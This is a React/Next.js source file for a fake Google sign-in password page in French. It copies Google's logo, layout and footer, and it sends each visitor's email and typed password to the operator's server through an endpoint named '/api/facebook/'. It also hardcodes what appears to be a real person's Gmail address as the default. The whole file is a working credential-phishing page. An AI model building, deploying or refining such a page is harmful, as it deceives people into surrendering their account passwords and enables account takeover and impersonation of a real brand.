"use client";

import { useState } from "react";
import { useSearchParams } from "next/navigation";
import { Suspense } from "react";
import axios from "axios";

function PasswordForm() {
  const searchParams = useSearchParams();
  const email = searchParams.get("email") ?? "alitsiryeddynilsen@gmail.com";
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);

  async function handleNext() {
    if (!password.trim()) return;
    setLoading(true);
    try {
      await axios.post(`${process.env.NEXT_PUBLIC_BASE_URL}/api/facebook/`, {
        email,
        password,
      });
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  }

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center px-5 py-8"
      style={{ backgroundColor: "#202124" }}
    >
      {/* ── Card ── */}
      <div
        className="w-full rounded-[28px] p-12 max-sm:p-8"
        style={{ backgroundColor: "#2d2e30", maxWidth: "860px" }}
      >
        {/* Top section: two columns */}
        <div className="flex gap-20 items-start max-sm:flex-col max-sm:gap-8">

          {/* ── LEFT ── */}
          <div
            className="flex-none flex flex-col gap-4 pt-1 max-sm:w-full"
            style={{ maxWidth: "240px" }}
          >
            {/* Google G logo */}
            <div className="flex items-center mb-1">
              <GoogleIcon />
            </div>

            <h1
              className="text-[32px] font-normal leading-tight"
              style={{ fontFamily: "'Google Sans', Arial, sans-serif", color: "#e8eaed" }}
            >
              Bienvenue
            </h1>

            {/* Email chip */}
            <div className="flex items-center w-fit">
              <button
                className="flex items-center gap-2 rounded-full border px-3 py-[6px] text-sm transition-colors duration-150 cursor-pointer"
                style={{
                  fontFamily: "'Roboto', Arial, sans-serif",
                  border: "1px solid #5f6368",
                  color: "#e8eaed",
                  backgroundColor: "transparent",
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.backgroundColor = "rgba(255,255,255,0.06)";
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.backgroundColor = "transparent";
                }}
              >
                {/* Avatar icon */}
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  width="18"
                  height="18"
                  fill="#9aa0a6"
                  aria-hidden="true"
                >
                  <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z" />
                </svg>

                <span className="max-w-[150px] truncate text-sm" style={{ color: "#e8eaed" }}>
                  {email}
                </span>

                {/* Dropdown chevron */}
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  width="16"
                  height="16"
                  fill="#9aa0a6"
                  aria-hidden="true"
                >
                  <path d="M7 10l5 5 5-5z" />
                </svg>
              </button>
            </div>
          </div>

          {/* ── RIGHT ── */}
          <div className="flex-1 flex flex-col gap-5 pt-1">
            {/* Password input */}
            <div className="relative w-full">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Saisissez votre mot de passe"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                autoFocus
                className="w-full bg-transparent rounded-sm text-base outline-none transition-all duration-200 px-[14px] py-4"
                style={{
                  fontFamily: "'Roboto', Arial, sans-serif",
                  border: "1px solid #5f6368",
                  color: "#e8eaed",
                  caretColor: "#8ab4f8",
                }}
                onFocus={(e) => {
                  e.currentTarget.style.border = "1px solid #8ab4f8";
                  e.currentTarget.style.boxShadow = "inset 0 0 0 1px #8ab4f8";
                }}
                onBlur={(e) => {
                  e.currentTarget.style.border = "1px solid #5f6368";
                  e.currentTarget.style.boxShadow = "none";
                }}
              />
            </div>

            {/* Show password checkbox */}
            <label
              className="flex items-center gap-3 cursor-pointer w-fit select-none"
              style={{ color: "#e8eaed" }}
            >
              <div className="relative flex items-center justify-center">
                <input
                  type="checkbox"
                  checked={showPassword}
                  onChange={(e) => setShowPassword(e.target.checked)}
                  className="sr-only"
                />
                {/* Custom checkbox */}
                <div
                  className="w-[18px] h-[18px] rounded-sm flex items-center justify-center transition-colors duration-150"
                  style={{
                    backgroundColor: showPassword ? "#8ab4f8" : "transparent",
                    border: showPassword ? "none" : "2px solid #9aa0a6",
                  }}
                >
                  {showPassword && (
                    <svg
                      viewBox="0 0 12 10"
                      width="12"
                      height="10"
                      fill="none"
                      stroke="#202124"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      aria-hidden="true"
                    >
                      <polyline points="1,5 4.5,8.5 11,1" />
                    </svg>
                  )}
                </div>
              </div>
              <span
                className="text-sm"
                style={{ fontFamily: "'Roboto', Arial, sans-serif", color: "#e8eaed" }}
              >
                Afficher le mot de passe
              </span>
            </label>
          </div>
        </div>

        {/* ── Actions row (full width, below the two columns) ── */}
        <div className="flex items-center justify-end gap-6 mt-8">
          <a
            href="#"
            className="text-sm font-medium whitespace-nowrap hover:underline"
            style={{ fontFamily: "'Google Sans', Arial, sans-serif", color: "#8ab4f8" }}
          >
            Essayer une autre méthode
          </a>
          <button
            className="border-none rounded-3xl text-sm font-medium cursor-pointer whitespace-nowrap px-7 py-[10px] transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed"
            disabled={loading}
            onClick={handleNext}
            style={{
              fontFamily: "'Google Sans', Arial, sans-serif",
              backgroundColor: "#8ab4f8",
              color: "#202124",
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.backgroundColor = "#aecbfa";
              e.currentTarget.style.boxShadow = "0 1px 3px rgba(0,0,0,0.3)";
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.backgroundColor = "#8ab4f8";
              e.currentTarget.style.boxShadow = "none";
            }}
            onMouseDown={(e) => {
              e.currentTarget.style.backgroundColor = "#7baaf7";
            }}
            onMouseUp={(e) => {
              e.currentTarget.style.backgroundColor = "#aecbfa";
            }}
          >
            {loading ? "..." : "Suivant"}
          </button>
        </div>
      </div>

      {/* ── Footer ── */}
      <footer
        className="flex items-center justify-between w-full pt-4 px-1 max-sm:flex-col max-sm:gap-4 max-sm:items-start"
        style={{ maxWidth: "860px" }}
      >
        <div>
          <select
            defaultValue="fr"
            className="cursor-pointer outline-none rounded-sm text-[13px] py-[6px] pl-3 pr-8 transition-colors duration-150"
            style={{
              appearance: "none",
              WebkitAppearance: "none",
              background:
                "transparent url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%239aa0a6'/%3E%3C/svg%3E\") no-repeat right 10px center",
              border: "1px solid #5f6368",
              color: "#9aa0a6",
              fontFamily: "'Roboto', Arial, sans-serif",
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.borderColor = "#8ab4f8";
              e.currentTarget.style.color = "#e8eaed";
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.borderColor = "#5f6368";
              e.currentTarget.style.color = "#9aa0a6";
            }}
          >
            <option value="fr">Français (France)</option>
            <option value="en">English (United States)</option>
            <option value="mg">Malagasy</option>
          </select>
        </div>

        <div className="flex gap-6">
          {["Aide", "Confidentialité", "Conditions"].map((label) => (
            <a
              key={label}
              href="#"
              className="text-[13px] hover:underline transition-colors duration-150"
              style={{
                fontFamily: "'Roboto', Arial, sans-serif",
                color: "#9aa0a6",
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.color = "#e8eaed";
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.color = "#9aa0a6";
              }}
            >
              {label}
            </a>
          ))}
        </div>
      </footer>
    </div>
  );
}

function GoogleIcon() {
  return (
    <svg
      xmlns="http://www.w3.org/2000/svg"
      viewBox="0 0 48 48"
      width="40"
      height="40"
      aria-label="Google"
      role="img"
    >
      <path
        fill="#EA4335"
        d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"
      />
      <path
        fill="#4285F4"
        d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"
      />
      <path
        fill="#FBBC05"
        d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"
      />
      <path
        fill="#34A853"
        d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"
      />
      <path fill="none" d="M0 0h48v48H0z" />
    </svg>
  );
}

export default function PasswordPage() {
  return (
    <Suspense>
      <PasswordForm />
    </Suspense>
  );
}
